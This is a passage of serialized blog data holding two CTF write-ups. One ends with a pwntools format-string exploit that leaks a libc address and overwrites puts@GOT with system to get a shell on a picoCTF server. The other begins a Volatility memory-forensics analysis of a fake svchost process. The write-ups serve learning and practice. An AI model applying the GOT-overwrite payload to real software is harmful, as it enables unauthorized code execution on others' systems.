=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'rhea.picoctf.net'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">60973\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">REMOTE\u003C/span>\u003Cspan style=\"color:#F97583\"> =\u003C/span>\u003Cspan style=\"color:#79B8FF\"> True\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Start process or connect to remote\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">s \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> remote(\u003C/span>\u003Cspan style=\"color:#79B8FF\">HOST\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">PORT\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#79B8FF\"> REMOTE\u003C/span>\u003Cspan style=\"color:#F97583\"> else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> elf.process()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># 1. Parse the leak\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">s.recvuntil(\u003C/span>\u003Cspan style=\"color:#F97583\">b\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"libc: \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">leak_line \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> s.recvline().strip()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">setvbuf_addr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(leak_line, \u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">log.info(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Leaked setvbuf: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{hex\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(setvbuf_addr)\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># 2. Calculate base and system address\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">libc.address \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> setvbuf_addr \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> libc.symbols[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'setvbuf'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">system_addr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> libc.symbols[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'system'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">log.info(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Libc Base: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{hex\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(libc.address)\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">log.info(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"System Address: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{hex\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(system_addr)\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># 3. Overwrite puts@got with system\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># We use pwntools' fmtstr_payload to automatically generate the write payload\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">puts_got \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> elf.got[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'puts'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># FmtStr helper to find the offset automatically (optional, usually 6 or 8 on 64-bit)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># For this challenge, we can likely assume standard offsets or find it manually.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Let's assume we found the format string offset is 38 (based on challenge context).\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">format_string_offset \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 38\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> fmtstr_payload(format_string_offset, {puts_got: system_addr})\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">s.sendline(payload)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">s.interactive()\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"running-the-exploit\">Running the Exploit\u003C/h3>\n\u003Cp>When we run the script:\u003C/p>\n\u003Col>\n\u003Cli>It catches the \u003Ccode>setvbuf\u003C/code> leak.\u003C/li>\n\u003Cli>Calculates the address of \u003Ccode>system\u003C/code>.\u003C/li>\n\u003Cli>Sends a payload that writes the \u003Ccode>system\u003C/code> address into the \u003Ccode>puts\u003C/code> GOT entry.\u003C/li>\n\u003Cli>When \u003Ccode>puts(\"/bin/sh\")\u003C/code> is called next, \u003Ccode>system(\"/bin/sh\")\u003C/code> executes instead.\u003C/li>\n\u003C/ol>\n\u003Cp>\u003Cimg src=\"/images/posts/format-string-3/fmt-str-8.png\" alt=\"Final Shell\">\u003C/p>\n\u003Cp>And just like that, we have a shell!\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/format-string-3/fmt-str-10.png\" alt=\"Success Meme\">\u003C/p>\n\u003Cp>\u003Cstrong>References:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Ca href=\"https://nuc13us.wordpress.com/2015/12/25/hack-using-global-offset-table/\">Hack Using Global Offset Table\u003C/a>\u003C/li>\n\u003C/ul>",{"headings":160,"localImagePaths":191,"remoteImagePaths":192,"frontmatter":193,"imagePaths":195},[161,164,167,170,173,176,179,182,185,188],{"depth":27,"slug":162,"text":163},"introduction","Introduction",{"depth":27,"slug":165,"text":166},"source-code-analysis","Source Code Analysis",{"depth":40,"slug":168,"text":169},"the-leak","The Leak",{"depth":27,"slug":171,"text":172},"vulnerability--strategy","Vulnerability & Strategy",{"depth":40,"slug":174,"text":175},"the-plan","The Plan",{"depth":40,"slug":177,"text":178},"understanding-the-gotplt","Understanding the GOT/PLT",{"depth":27,"slug":180,"text":181},"debugging--exploitation","Debugging & Exploitation",{"depth":40,"slug":183,"text":184},"calculating-offsets","Calculating Offsets",{"depth":27,"slug":186,"text":187},"the-exploit-script","The Exploit Script",{"depth":40,"slug":189,"text":190},"running-the-exploit","Running the Exploit",[],[],{"title":152,"date":194},"2025-12-17",[],"like-father-like-son",{"id":196,"data":198,"body":201,"filePath":202,"digest":203,"rendered":204},{"title":199,"date":200},"Like Father Like Son - DFIR report",["Date","2025-12-17T00:00:00.000Z"],"# Description\r\n\r\nDamian Wayne stored a secret in his old pc, but Dr. Simon Hurt who got this information, planned a contingency against Damian by the help of Starlab's techies, poor Damaian was so eager to view the encrypted secret file that Raven sent him long back but Simon knows this piece of information as well as the decryption process, will he win this situation like a Wayne? will Damaian's Redemption be successful!?\r\n\r\nNote: This challenge doesn't have any questions but the flag itself!\r\n\r\nFile Password : vOCorthoAGESeNsivEli\r\n\r\n## Initial Analysis\r\n\r\nLet's first see the profile of the dump \r\n\r\n\r\n```\r\nPS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem imageinfo \r\nVolatility Foundation Volatility Framework 2.6\r\nINFO    : volatility.debug    : Determining profile based on KDBG search...\r\n          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418\r\n                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)\r\n                     AS Layer2 : FileAddressSpace (D:\\DFIR-LABS\\bi0sctfchall1\\Damian.mem)\r\n                      PAE type : No PAE\r\n                           DTB : 0x187000L\r\n                          KDBG : 0xf8000280f0a0L\r\n          Number of Processors : 6\r\n     Image Type (Service Pack) : 1\r\n                KPCR for CPU 0 : 0xfffff80002810d00L\r\n                KPCR for CPU 1 : 0xfffff880009ea000L\r\n                KPCR for CPU 2 : 0xfffff880030a8000L\r\n                KPCR for CPU 3 : 0xfffff8800311d000L\r\n                KPCR for CPU 4 : 0xfffff88003192000L\r\n                KPCR for CPU 5 : 0xfffff880031c7000L\r\n             KUSER_SHARED_DATA : 0xfffff78000000000L\r\n           Image date and time : 2023-05-06 16:45:20 UTC+0000\r\n     Image local date and time : 2023-05-06 22:15:20 +0530\r\n```\r\n\r\nNow lets enumerate the pslist\r\n\r\n```\r\nPS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 pslist\r\nVolatility Foundation Volatility Framework 2.6\r\nOffset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit\r\n------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------\r\n0xfffffa80036e2040 System                    4      0     98      469 ------      0 2023-05-06 16:43:35 UTC+0000\r\n0xfffffa8004961300 smss.exe                272      4      2       34 ------      0 2023-05-06 16:43:35 UTC+0000\r\n0xfffffa80062e8a20 csrss.exe               352    332     10      353      0      0 2023-05-06 16:43:38 UTC+0000\r\n0xfffffa80047ca060 wininit.exe             404    332      4       84      0      0 2023-05-06 16:43:39 UTC+0000\r\n0xfffffa80047c8360 csrss.exe               412    396     10      290      1      0 2023-05-06 16:43:39 UTC+0000\r\n0xfffffa800643a740 services.exe            464    404     14      196      0      0 2023-05-06 16:43:39 UTC+0000\r\n0xfffffa8006444060 winlogon.exe            488    396      6      121      1      0 2023-05-06 16:43:39 UTC+0000\r\n0xfffffa800498f260 lsass.exe               516    404     11      581      0      0 2023-05-06 16:43:40 UTC+0000\r\n0xfffffa800644d5b0 lsm.exe                 524    404     10      147      0      0 2023-05-06 16:43:40 UTC+0000\r\n0xfffffa800632a660 svchost.exe             628    464     13      372      0      0 2023-05-06 16:43:40 UTC+0000\r\n0xfffffa80064d2b30 VBoxService.ex          692    464     13      123      0      0 2023-05-06 16:43:40 UTC+0000\r\n0xfffffa800644bb30 svchost.exe             760    464      8      255      0      0 2023-05-06 16:43:41 UTC+0000\r\n0xfffffa800651ab30 svchost.exe             840    464     20      392      0      0 2023-05-06 16:43:41 UTC+0000\r\n0xfffffa800654a7c0 svchost.exe             896    464     21      476      0      0 2023-05-06 16:43:41 UTC+0000\r\n0xfffffa8006552940 svchost.exe             924    464     33      875      0      0 2023-05-06 16:43:41 UTC+0000\r\n0xfffffa8006575b30 audiodg.exe            1000    840      8      136      0      0 2023-05-06 16:43:41 UTC+0000\r\n0xfffffa8004871060 svchost.exe             296    464     13      290      0      0 2023-05-06 16:43:41 UTC+0000\r\n0xfffffa80065cfb30 svchost.exe             348    464     18      387      0      0 2023-05-06 16:43:41 UTC+0000\r\n0xfffffa8006651a30 spoolsv.exe            1140    464     15      315      0      0 2023-05-06 16:43:42 UTC+0000\r\n0xfffffa800656ab30 svchost.exe            1180    464     21      332      0      0 2023-05-06 16:43:42 UTC+0000\r\n0xfffffa80066dbb30 taskhost.exe           1312    464     10      155      1      0 2023-05-06 16:43:43 UTC+0000\r\n0xfffffa8006742b30 dwm.exe                1448    896      6      103      1      0 2023-05-06 16:43:43 UTC+0000\r\n0xfffffa8006783060 explorer.exe           1532   1416     40     1002      1      0 2023-05-06 16:43:43 UTC+0000\r\n0xfffffa800676d490 VBoxTray.exe           2044   1532     15      149      1      0 2023-05-06 16:43:44 UTC+0000\r\n0xfffffa80066e3060 SearchIndexer.          300    464     14      644      0      0 2023-05-06 16:43:51 UTC+0000\r\n0xfffffa8006305b30 SearchProtocol         1756    300      9      382      0      0 2023-05-06 16:43:51 UTC+0000\r\n0xfffffa8006907b30 SearchFilterHo         1580    300      7      143      0      0 2023-05-06 16:43:51 UTC+0000\r\n0xfffffa80062f5300 iexplore.exe           2668   1532     22      477      1      1 2023-05-06 16:44:41 UTC+0000\r\n0xfffffa80038a2b30 iexplore.exe           2752   2668     21      434      1      1 2023-05-06 16:44:41 UTC+0000\r\n0xfffffa8006434b30 iexplore.exe           2892   2668     20      388      1      1 2023-05-06 16:44:47 UTC+0000\r\n0xfffffa8003967b30 scvhost.exe            1924   1532      5       55      1      0 2023-05-06 16:44:54 UTC+0000\r\n0xfffffa800393db30 conhost.exe            2292    412      3       51      1      0 2023-05-06 16:44:54 UTC+0000\r\n0xfffffa800398f660 notepad.exe            2320   1924      2       57      1      0 2023-05-06 16:44:54 UTC+0000\r\n0xfffffa800699e750 RamCapture64.e          596   1532      3       77      1      0 2023-05-06 16:45:18 UTC+0000\r\n0xfffffa8003985060 conhost.exe            1900    412      2       51      1      0 2023-05-06 16:45:18 UTC+0000\r\n0xfffffa800664f1b0 svchost.exe            2168    464      5        0 ------      0 2023-05-06 16:45:49 UTC+0000\r\n```\r\n\r\nOk so notepad running is always an indication to be checked as ive realised from MEMLABS\r\n\r\nSo lets dump notepad and see any .dat or what started notepad , we'll use pstree to see the parent child process spawn data .\r\n\r\n```\r\nPS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 pslist | Select-String \"2320\"\r\nVolatility Foundation Volatility Framework 2.6\r\n\r\n0xfffffa800398f660 notepad.exe            2320   1924      2       57      1      0 2023-05-06 16:44:54 UTC+0000\r\n\r\n\r\nPS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 pslist | Select-String \"1924\"\r\nVolatility Foundation Volatility Framework 2.6\r\n\r\n0xfffffa8003967b30 scvhost.exe            1924   1532      5       55      1      0 2023-05-06 16:44:54 UTC+0000\r\n0xfffffa800398f660 notepad.exe            2320   1924      2       57      1      0 2023-05-06 16:44:54 UTC+0000\r\n\r\n```\r\n\r\nOkie so The process name is scvhost.exe which is a typo/misspelling of the legitimate Windows process svchost.exe \r\n\r\nThis could be a malware and we'll use malfind next for more investigation later  . \r\n\r\n\r\ncoming back to see what the commands were \r\n\r\n```\r\n\r\nPS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 cmdline -p 1924              \r\nVolatility Foundation Volatility Framework 2.6\r\n************************************************************************\r\nscvhost.exe pid:   1924\r\nCommand line : \"C:\\Users\\EdwardNygma7\\Downloads\\windows-patch-update\\scvhost.exe\"\r\n\r\n```\r\n\r\nAlso edward nygma is riddler which might be a clue ? \r\n\r\n\r\nNow that we;ve made sure that this was a malware pretending to be a legitimate process lets run malfind .\r\n\r\n```\r\nPS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 malfind        \r\nVolatility Foundation Volatility Framework 2.6\r\nProcess: explorer.exe Pid: 1532 Address: 0x3dc0000\r\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\r\nFlags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6\r\n\r\n0x03dc0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n0x03dc0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n0x03dc0020  00 00 dc 03 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n0x03dc0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n\r\n0x03dc0000 0000             ADD [EAX], AL\r\n0x03dc0002 0000             ADD [EAX], AL\r\n0x03dc0004 0000             ADD [EAX], AL\r\n0x03dc0006 0000             ADD [EAX], AL\r\n0x03dc0008 0000             ADD [EAX], AL\r\n0x03dc000a 0000             ADD [EAX], AL\r\n0x03dc000c 0000             ADD [EAX], AL\r\n0x03dc000e 0000             ADD [EAX], AL\r\n0x03dc0010 0000             ADD [EAX], AL\r\n0x03dc0012 0000             ADD [EAX], AL\r\n0x03dc0014 0000             ADD [EAX], AL\r\n0x03dc0016 0000             ADD [EAX], AL\r\n0x03dc0018 0000             ADD [EAX], AL\r\n0x03dc001a 0000             ADD [EAX], AL\r\n0x03dc001c 0000             ADD [EAX], AL\r\n0x03dc001e 0000             ADD [EAX], AL\r\n0x03dc0020 0000             ADD [EAX], AL\r\n0x03dc0022 dc03             FADD QWORD [EBX]\r\n0x03dc0024 0000             ADD [EAX], AL\r\n0x03dc0026 0000             ADD [EAX], AL\r\n0x03dc0028 0000             ADD [EAX], AL\r\n0x03dc002a 0000             ADD [EAX], AL\r\n0x03dc002c 0000             ADD [EAX], AL\r\n0x03dc002e 0000             ADD [EAX], AL\r\n0x03dc0030 0000             ADD [EAX], AL\r\n0x03dc0032 0000             ADD [EAX], AL\r\n0x03dc0034 0000             ADD [EAX], AL\r\n0x03dc0036 0000             ADD [EAX], AL\r\n0x03dc0038 0000             ADD [EAX], AL\r\n0x03dc003a 0000             ADD [EAX], AL\r\n0x03dc003c 0000             ADD [EAX], AL\r\n0x03dc003e 0000             ADD [EAX], AL\r\n\r\nProcess: explorer.exe Pid: 1532 Address: 0x4180000\r\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\r\nFlags: CommitCharge: 16, MemCommit: 1, PrivateMemory: 1, Protection: 6\r\n\r\n0x04180000  41 ba 80 00 00 00 48 b8 38 a1 ee fd fe 07 00 00   A.....H.8.......\r\n0x04180010  48 ff 20 90 41 ba 81 00 00 00 48 b8 38 a1 ee fd   H...A.....H.8...\r\n0x04180020  fe 07 00 00 48 ff 20 90 41 ba 82 00 00 00 48 b8   ....H...A.....H.\r\n0x04180030  38 a1 ee fd fe 07 00 00 48 ff 20 90 41 ba 83 00   8.......H...A...\r\n\r\n0x04180000 41               INC ECX\r\n0x04180001 ba80000000       MOV EDX, 0x80\r\n0x04180006 48               DEC EAX\r\n0x04180007 b838a1eefd       MOV EAX, 0xfdeea138\r\n0x0418000c fe07             INC BYTE [EDI]\r\n0x0418000e 0000             ADD [EAX], AL\r\n0x04180010 48               DEC EAX\r\n0x04180011 ff20             JMP DWORD [EAX]\r\n0x04180013 90               NOP\r\n0x04180014 41               INC ECX\r\n0x04180015 ba81000000       MOV EDX, 0x81\r\n0x0418001a 48               DEC EAX\r\n0x0418001b b838a1eefd       MOV EAX, 0xfdeea138\r\n0x04180020 fe07             INC BYTE [EDI]\r\n0x04180022 0000             ADD [EAX], AL\r\n0x04180024 48               DEC EAX\r\n0x04180025 ff20             JMP DWORD [EAX]\r\n0x04180027 90               NOP\r\n0x04180028 41               INC ECX\r\n0x04180029 ba82000000       MOV EDX, 0x82\r\n0x0418002e 48               DEC EAX\r\n0x0418002f b838a1eefd       MOV EAX, 0xfdeea138\r\n0x04180034 fe07             INC BYTE [EDI]\r\n0x04180036 0000             ADD [EAX], AL\r\n0x04180038 48               DEC EAX\r\n0x04180039 ff20             JMP DWORD [EAX]\r\n0x0418003b 90               NOP\r\n0x0418003c 41               INC ECX\r\n0x0418003d ba               DB 0xba\r\n0x0418003e 83               DB 0x83\r\n0x0418003f 00               DB 0x0\r\n\r\nProcess: SearchFilterHo Pid: 1580 Address: 0xc50000\r\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\r\nFlags: CommitCharge: 2, PrivateMemory: 1, Protection: 6\r\n\r\n0x00c50000  00 00 00 00 00 00 00 00 09 83 17 8f 1c e3 00 01   ................\r\n0x00c50010  ee ff ee ff 00 00 00 00 28 01 c5 00 00 00 00 00   ........(.......\r\n0x00c50020  28 01 c5 00 00 00 00 00 00 00 c5 00 00 00 00 00   (...............\r\n0x00c50030  00 00 c5 00 00 00 00 00 80 00 00 00 00 00 00 00   ................\r\n\r\n0x00c50000 0000             ADD [EAX], AL\r\n0x00c50002 0000             ADD [EAX], AL\r\n0x00c50004 0000             ADD [EAX], AL\r\n0x00c50006 0000             ADD [EAX], AL\r\n0x00c50008 0983178f1ce3     OR [EBX-0x1ce370e9], EAX\r\n0x00c5000e 0001             ADD [ECX], AL\r\n0x00c50010 ee               OUT DX, AL\r\n0x00c50011 ff               DB 0xff\r\n0x00c50012 ee               OUT DX, AL\r\n0x00c50013 ff00             INC DWORD [EAX]\r\n0x00c50015 0000             ADD [EAX], AL\r\n0x00c50017 0028             ADD [EAX], CH\r\n0x00c50019 01c5             ADD EBP, EAX\r\n0x00c5001b 0000             ADD [EAX], AL\r\n0x00c5001d 0000             ADD [EAX], AL\r\n0x00c5001f 0028             ADD [EAX], CH\r\n0x00c50021 01c5             ADD EBP, EAX\r\n0x00c50023 0000             ADD [EAX], AL\r\n0x00c50025 0000             ADD [EAX], AL\r\n0x00c50027 0000             ADD [EAX], AL\r\n0x00c50029 00c5             ADD CH, AL\r\n0x00c5002b 0000             ADD [EAX], AL\r\n0x00c5002d 0000             ADD [EAX], AL\r\n0x00c5002f 0000             ADD [EAX], AL\r\n0x00c50031 00c5             ADD CH, AL\r\n0x00c50033 0000             ADD [EAX], AL\r\n0x00c50035 0000             ADD [EAX], AL\r\n0x00c50037 008000000000     ADD [EAX+0x0], AL\r\n0x00c5003d 0000             ADD [EAX], AL\r\n0x00c5003f 00               DB 0x0\r\n\r\nProcess: iexplore.exe Pid: 2668 Address: 0xf60000\r\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\r\nFlags: CommitCharge: 2, MemCommit: 1, PrivateMemory: 1, Protection: 6\r\n\r\n0x00f60000  b0 00 eb 70 b0 01 eb 6c b0 02 eb 68 b0 03 eb 64   ...p...l...h...d\r\n0x00f60010  b0 04 eb 60 b0 05 eb 5c b0 06 eb 58 b0 07 eb 54   ...`...\\\\...X...T\r\n0x00f60020  b0 08 eb 50 b0 09 eb 4c b0 0a eb 48 b0 0b eb 44   ...P...L...H...D\r\n0x00f60030  b0 0c eb 40 b0 0d eb 3c b0 0e eb 38 b0 0f eb 34   ...@...\u003C...8...4\r\n\r\n0x00f60000 b000             MOV AL, 0x0\r\n0x00f60002 eb70             JMP 0xf60074\r\n0x00f60004 b001             MOV AL, 0x1\r\n0x00f60006 eb6c             JMP 0xf60074\r\n0x00f60008 b002             MOV AL, 0x2\r\n0x00f6000a eb68             JMP 0xf60074\r\n0x00f6000c b003             MOV AL, 0x3\r\n0x00f6000e eb64             JMP 0xf60074\r\n0x00f60010 b004             MOV AL, 0x4\r\n0x00f60012 eb60             JMP 0xf60074\r\n0x00f60014 b005             MOV AL, 0x5\r\n0x00f60016 eb5c             JMP 0xf60074\r\n0x00f60018 b006             MOV AL, 0x6\r\n0x00f6001a eb58             JMP 0xf60074\r\n0x00f6001c b007             MOV AL, 0x7\r\n0x00f6001e eb54             JMP 0xf60074\r\n0x00f60020 b008             MOV AL, 0x8\r\n0x00f60022 eb50             JMP 0xf60074\r\n0x00f60024 b009             MOV AL, 0x9\r\n0x00f60026 eb4c             JMP 0xf60074\r\n0x00f60028 b00a             MOV AL, 0xa\r\n0x00f6002a eb48             JMP 0xf60074\r\n0x00f6002c b00b             MOV AL, 0xb\r\n0x00f6002e eb44             JMP 0xf60074\r\n0x00f60030 b00c             MOV AL, 0xc\r\n0x00f60032 eb40             JMP 0xf60074\r\n0x00f60034 b00d             MOV AL, 0xd\r\n0x00f60036 eb3c             JMP 0xf60074\r\n0x00f60038 b00e             MOV AL, 0xe\r\n0x00f6003a eb38             JMP 0xf60074\r\n0x00f6003c b00f             MOV AL, 0xf\r\n0x00f6003e eb34             JMP 0xf60074\r\n\r\nProcess: iexplore.exe Pid: 2668 Address: 0x5fff0000\r\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\r\nFlags: CommitCharge: 16, MemCommit: 1, PrivateMemory: 1, Protection: 6\r\n\r\n0x5fff0000  64 74 72 52 00 00 00 00 00 02 ff 5f 00 00 00 00   dtrR......._....\r\n0x5fff0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n0x5fff0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n0x5fff0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\r\n\r\n0x5fff0000 647472           JZ 0x5fff0075\r\n0x5fff0003 52               PUSH EDX\r\n0x5fff0004 0000             ADD [EAX], AL\r\n0x5fff0006 0000             ADD [EAX], AL\r\n0x5fff0008 0002             ADD [EDX], AL\r\n0x5fff000a ff5f00           CALL FAR DWORD [EDI+0x0]\r\n0x5fff000d 0000             ADD [EAX], AL\r\n0x5fff000f 0000             ADD [EAX], AL\r\n0x5fff0011 0000             ADD [EAX], AL\r\n0x5fff0013 0000             ADD [EAX], AL\r\n0x5fff0015 0000             ADD [EAX], AL\r\n0x5fff0017 0000             ADD [EAX], AL\r\n0x5fff0019 0000             ADD [EAX], AL\r\n0x5fff001b 0000             ADD [EAX], AL\r\n0x5fff001d 0000             ADD [EAX], AL\r\n0x5fff001f 0000             ADD [EAX], AL\r\n0x5fff0021 0000             ADD [EAX], AL\r\n0x5fff0023 0000             ADD [EAX], AL\r\n0x5fff0025 0000             ADD [EAX], AL\r\n0x5fff0027 0000             ADD [EAX], AL\r\n0x5fff0029 0000             ADD [EAX], AL\r\n0x5fff002b 0000             ADD [EAX], AL\r\n0x5fff002d 0000             ADD [EAX], AL\r\n0x5fff002f 0000             ADD [EAX], AL\r\n0x5fff0031 0000             ADD [EAX], AL\r\n0x5fff0033 0000             ADD [EAX], AL\r\n0x5fff0035 0000             ADD [EAX], AL\r\n0x5fff0037 0000             ADD [EAX], AL\r\n0x5fff0039 0000             ADD [EAX], AL\r\n0x5fff003b 0000             ADD [EAX], AL\r\n0x5fff003d 0000             ADD [EAX], AL\r\n0x5fff003f 00               DB 0x0\r\n\r\nProcess: iexplore.exe Pid: 2752 Address: 0xde0000\r\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\r\nFlags: CommitCharge: 2, MemCommit: 1, PrivateMemory: 1, Protection: 6\r\n\r\n0x00de0000  b0 00 eb 70 b0 01 eb 6c b0 02 eb 68 b0 03 eb 64   ...p...l...h...d\r\n0x00de0010  b0 04 eb 60 b0 05 eb 5c b0 06 eb 58 b0 07 eb 54   ...`...\\\\...X...T\r\n0x00de0020  b0 08 eb 50 b0 09 eb 4c b0 0a eb 48 b0 0b eb 44   ...P...L...H...D\r\n0x00de0030  b0 0c eb 40 b0 0d eb 3c b0 0e eb 38 b0 0f eb 34   ...@...\u003C...8...4\r\n\r\n0x00de0000 b000             MOV AL, 0x0\r\n0x00de0002 eb70             JMP 0xde0074\r\n0x00de0004 b001             MOV AL, 0x1\r\n0x00de0006 eb6c             JMP 0xde0074\r\n0x00de0008 b002             MOV AL, 0x2\r\n0x00de000a eb68             JMP 0xde0074\r\n0x00de000c b003             MOV AL, 0x3\r\n0x00de000e eb64             JMP 0xde0074\r\n0x00de0010 b004             MOV AL, 0x4\r\n0x00de0012 eb60             JMP 0xde0074\r\n0x00de0014 b005             MOV AL, 0x5\r\n0x00de0016 eb5c             JMP 0xde0074\r\n0x00de0018 b006             MOV AL, 0x6\r\n0x00de001a eb58             JMP 0xde0074\r\n0x00de001c b007             MOV AL, 0x7\r\n0x00de001e eb54             JMP 